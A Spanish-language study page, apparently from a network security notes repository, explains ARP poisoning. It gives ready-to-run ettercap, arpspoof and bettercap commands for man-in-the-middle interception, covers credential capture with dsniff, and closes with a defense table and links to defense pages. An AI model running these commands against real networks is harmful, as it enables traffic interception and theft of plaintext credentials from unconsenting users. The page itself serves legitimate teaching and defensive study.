# ARP Poisoning / ARP Spoofing

## Concepto

```
Estado Normal:
┌─────────┐                      ┌─────────┐
│ Víctima │ ──────────────────── │ Gateway │
│ .10     │  ARP: .1 = MAC_GW    │ .1      │
└─────────┘                      └─────────┘

Después del Ataque:
┌─────────┐     ┌──────────┐     ┌─────────┐
│ Víctima │ ──> │ Atacante │ ──> │ Gateway │
│ .10     │     │ .50      │     │ .1      │
└─────────┘     └──────────┘     └─────────┘
ARP: .1 = MAC_ATACANTE (falso!)
```

## Ataque con Ettercap

### Modo Gráfico
```bash
sudo ettercap -G
```
1. Sniff > Unified sniffing > Seleccionar interfaz
2. Hosts > Scan for hosts
3. Hosts > Host list
4. Seleccionar Target 1 (víctima) → Add to Target 1
5. Seleccionar Target 2 (gateway) → Add to Target 2
6. Mitm > ARP poisoning > ☑ Sniff remote connections
7. Start > Start sniffing

### Modo Texto
```bash
# Sintaxis
sudo ettercap -T -M arp:remote /TARGET1// /TARGET2//

# Ejemplo: Víctima 192.168.1.10, Gateway 192.168.1.1
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10//

# Envenenar toda la red
sudo ettercap -T -M arp:remote /// ///

# Con guardado de capturas
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.10// -w captura.pcap
```

## Ataque con arpspoof

```bash
sudo apt-get install dsniff

# Habilitar IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Envenenar víctima (hacerle creer que somos el gateway)
sudo arpspoof -i eth0 -t 192.168.1.10 192.168.1.1

# En otra terminal, envenenar gateway
sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.10
```

## Ataque con Bettercap

```bash
sudo bettercap -iface eth0

# Dentro de bettercap
net.probe on
net.show
set arp.spoof.targets 192.168.1.10
arp.spoof on
net.sniff on
```

## Verificación del Ataque

### Desde la víctima (Windows)
```cmd
arp -a
# Buscar: La MAC del gateway ha cambiado a la MAC del atacante

tracert -d 8.8.8.8
# Primer salto muestra IP del atacante
```

### Desde la víctima (Linux)
```bash
ip neigh show
# La MAC del gateway es la del atacante

traceroute -n 8.8.8.8
```

### Desde Wireshark
```
Filtro: arp
Buscar:
- ARP Reply no solicitados (gratuitous ARP)
- Múltiples ARP Reply para misma IP
- ARP con MACs inconsistentes
```

## Captura de Credenciales

### Durante el MITM
```bash
# Ettercap captura automáticamente
# Ver en la consola: usuarios/contraseñas en texto plano

# O usar dsniff
sudo dsniff -i eth0
```

### Protocolos vulnerables
- HTTP (no HTTPS)
- FTP
- Telnet
- POP3/IMAP sin TLS

## Defensa

| Medida | Efectividad |
|--------|-------------|
| **ARP Inspection (DAI)** | Alta - Valida ARP vs DHCP binding |
| **ARP estático** | Media - No escala |
| **VLAN segmentación** | Media - Limita alcance |
| **VPN/Cifrado** | Alta - Protege aunque haya MITM |

## Notas

- IP forwarding debe estar activo para que el tráfico fluya
- Sin forwarding = DoS (el tráfico no llega al destino)
- Ettercap restaura ARP al salir (Ctrl+C)

---

## Ver también

- [ARP Inspection](../../02_configuracion/seguridad/arp_inspection.md) - **DEFENSA** contra ARP Poisoning
- [DHCP Snooping](../../02_configuracion/seguridad/dhcp_snooping.md) - Prerequisito para ARP Inspection
- [Ettercap](../herramientas/ettercap.md) - Guía completa de la herramienta
- [Verificación](../../04_defensa/monitoreo/verificacion.md) - Probar que la defensa funciona

---

[← Volver al Índice](../../INDEX.md)
